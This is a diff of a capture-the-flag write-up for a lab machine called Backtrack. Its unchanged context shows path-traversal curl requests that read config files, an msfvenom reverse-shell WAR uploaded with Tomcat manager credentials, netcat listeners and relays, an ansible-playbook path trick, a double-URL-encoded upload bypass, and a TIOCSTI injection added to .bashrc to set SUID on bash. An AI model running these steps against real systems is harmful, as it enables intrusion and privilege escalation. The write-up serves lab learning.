@@ -167,6 +167,7 @@ wilbur:x:1004:1004::/home/wilbur:/bin/bash
 ```
 5. Now that we are able to read random files on the system I was trying to search for interesting stuff based on /etc/passwd file:
 6. Tryied to read mysql config as we have a mysql user:
+
 ```sh
 curl --path-as-is http://10.10.191.125:8888/../../../../../../../../../../../../../../../../../../../../etc/mysql/my.cnf
 #
@@ -193,6 +194,7 @@ curl --path-as-is http://10.10.191.125:8888/../../../../../../../../../../../../
 ```
 7. Tried to read random flag.txt files inside both home locations for user *orville* and *wilbur* with no luck
 8. Finally tried to read user config file for Tomcat using default location:
+
 ```sh
 curl --path-as-is http://10.10.191.125:8888/../../../../../../../../../../../../../../../../../../../../opt/tomcat/conf/tomcat-users.xml
 <?xml version="1.0" encoding="UTF-8"?>
@@ -209,6 +211,7 @@ curl --path-as-is http://10.10.191.125:8888/../../../../../../../../../../../../
 9. Since I'm not proficient with Tomcat config, first I tried to login from browser with the discovered user and password on `http://10.10.1.70:8080` but I run into an error like 'By default the Host Manager is only accessible from a browser running on the same machine as Tomcat...'
 10. Digging deeper I found there are different roles in Tomcat and the one assigned to user I found is `manager-script`. This role can't access `/host-manager/html` from GUI, only via text-web-service (more on the topic here: https://www.baeldung.com/tomcat-manager-app)
 11. For the beginning let's list all deployed apps:
+
 ```sh
 curl -u tomcat:OPx52k53D8OkTZpx4fr http://10.10.1.70:8080/manager/text/list
 OK - Listed applications for virtual host [localhost]
@@ -221,16 +224,19 @@ OK - Listed applications for virtual host [localhost]
 ```
 12. Next step will be to try establish a reverse shell
 13. For that we will manually generate a .war (Web Application Archive) file using a tool like `msfvenom` :
+
 ```sh
 msfvenom -p java/jsp_shell_reverse_tcp lhost=10.11.79.193 lport=4455 -f war > shell.war
 ```
 14. Upload the file from text-web-interface as described in the link above:
+
 ```sh
 curl --upload-file shell.war -u tomcat:OPx52k53D8OkTZpx4fr "http://10.10.1.70:8080/manager/text/deploy?path=/shell"
 ```
 15. Start a local listener `nc -lvnp 4455` and access the revshell from browser `http://10.10.1.70:8080/shell/`
 16. NOTE using Metasploit with `tomcat_mgr_upload` exploit will not work as that exploit targets users with GUI access
 17. To make our job easier we will stabiles the shell
+
 ```sh
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 export TERM=xterm
@@ -244,6 +250,7 @@ stty raw -echo; fg
 
 ### Privilege escalation
 1. To continue I run `sudo -l` and found:
+
 ```sh
 Matching Defaults entries for tomcat on Backtrack:
     env_reset, mail_badpass,
@@ -256,6 +263,7 @@ User tomcat may run the following commands on Backtrack:
 6. Trying to privesc I lost a lot of time to move the `linpeas.sh` script and hunt for "ghosts" (truth being told I did this machine on the Halloween day)
 7. Trying to lateral move from `tomcat` to `wilbur` I return to my initial finding, the `ansible` scrip, and start building a plan
 8. First I'll need to create my `shell.yml` script to start a reverse shell and start a listener locally (read more about ansible script exploit here https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/ansible-playbook-privilege-escalation/)
+
 ```sh
 - hosts: localhost
   tasks:
@@ -264,11 +272,13 @@ User tomcat may run the following commands on Backtrack:
 ```
 9. Now I have to find a way to give my script as a parameter!!!
 10. After a lot of attempts I found that the script can be fooled using the name of the CTF `../`, and I managed to run it by placing my `.yml` file in the `/tmp` folder and run it like:
+
 ```sh
 sudo -u wilbur /usr/bin/ansible-playbook /opt/test_playbooks/../../tmp/shell.yml
 ```
 11. A new reverse shell was created and now I have access as `wilbur`
 12. Looking around I found two interesting files in the user `/home` directory
+
 ```sh
 #from_orville.txt 
 Hey Wilbur, it\'s Orville. I just finished developing the image gallery web app I told you about last week, and it works just fine. However, I\'d like you to test it yourself to see if everything works and secure.
@@ -284,6 +294,7 @@ wilbur:mYe317Tb9qTNrWFND7KF
 ```
 13. Looks like `wilbur` password is working for SSH login
 14. Reading the message about the application under test, I was curious to see what other ports are exposed locally and I run a `netstat`
+
 ```sh
 netstat -lntu
 Active Internet connections (only servers)
@@ -303,6 +314,7 @@ udp        0      0 127.0.0.53:53           0.0.0.0:*
 udp        0      0 10.10.225.249:68        0.0.0.0:* 
 ```
 15. The first port I checked locally was 80 and indeed is running some app related to image gallery
+
 ```sh
 curl http://127.0.0.1:80
 
@@ -314,6 +326,7 @@ Login and start uploading images!
 16. In order to test the application we need to forward `localhost:80` to a port bound to the external IP
 17. For this I tried to use SSH `ssh -f -N -R 0.0.0.0:5588:localhost:80 wilbur@10.10.254.205` but after some exploration I found it does not allow remote port forwarding to bind to non-localhost addresses for security reasons
 18. Next I moved to NetCat as is already installed on the machine. With it I was a bit luckier meaning I was able to make one request at a time before timeout
+
 ```sh
 mkfifo /tmp/pipe_in /tmp/pipe_out
 cat /tmp/pipe_in | nc -l -p 7733 | tee /tmp/pipe_out &bg
@@ -324,6 +337,7 @@ cat /tmp/pipe_out | nc localhost 80 > /tmp/pipe_in &bg
 I have a web application running on localhost port 80 and I need to forward the traffic to the same machine\'s public IP 10.10.254.205 port 7733 so I can access the web app from the internet. Please provide me a simple solution. Keep in mind that mi user wilbur has limited access on the Ubuntu machine and is not allowed to use sudo. The only external tool I have installed is netcat.
 ```
 20. In no time he provided me the solution in the form of a simple TCP Proxy as a Python script:
+
 ```python
 #!/usr/bin/env python3
 
@@ -374,6 +388,7 @@ if __name__ == '__main__':
 24. The next step will be to find a way to upload a file named `../payload.jpg.php` and hope the script will simply concatenate the file path with file name resulting in something like `/uploads/../payload.jpg.php` this way we can simply run the file outside restricted directory like `http://10.10.191.31:7733/payload.jpg.php`
 25. The problem is that the application is removing special characters like`./` and we need to find a way to encode it to pass the filters
 26. After a couple of attempts I have double URL encoded the character and it worked. Basically I have encoded `../xcat.jpg.php` to `%252e%252e%252fxcat.jpg.php` and I have replaced the file content with a simple PHP
+
 ```php
 <?php
 echo "PHP is working!";
@@ -385,6 +400,7 @@ echo "PHP is working!";
 1. In the user home directory there is a file called `flag2.txt` containing the second flag: **[FLAG2]**
 2. In the `orville` home directory there is an archive you can open with `unzip web_snapshot.zip`
 3. The archive contains a data base configuration file `var/www/html/includes/db.php` containing user name and password to connect to MySQL
+
 ```sh
 $host = 'localhost';
 $dbname = 'backtrack';
@@ -392,6 +408,7 @@ $username = 'orville';
 $password = '3uK32VD7YRtVHsrehoA3';
 ```
 4. With the above credentials you can connect to the data base and look for interesting stuff (like other users credentials):
+
 ```sh
 # Connect to the data base
 mysql -h localhost -u orville -p #add password when prompted
@@ -415,6 +432,7 @@ select * from user;
 9. Basically while running the `su` command, the `root` user does not use the `-P` flag, meaning no new `PTY` is allocated 
 10. User `orville` can abuse it by sending a `SIGSTOP` signal to it, allowing focus to shift to the `root` shell
 11. On the link above you can find the POC as a Python script you can use to crate a file called `ttyPush.py` in `orville` home directory
+
 ```python
 #!/usr/bin/env python3
 import fcntl
@@ -429,6 +447,7 @@ for char in 'chmod +s /bin/bash\n':
     fcntl.ioctl(0, termios.TIOCSTI, char)
 ```
 12. Next we add the script to `.bashrc` so it can be executed by `root`
+
 ```sh
 echo "python3 /home/orville/ttyPush.py 'chmod +s /usr/bin/bash'" >> .bashrc
 ```
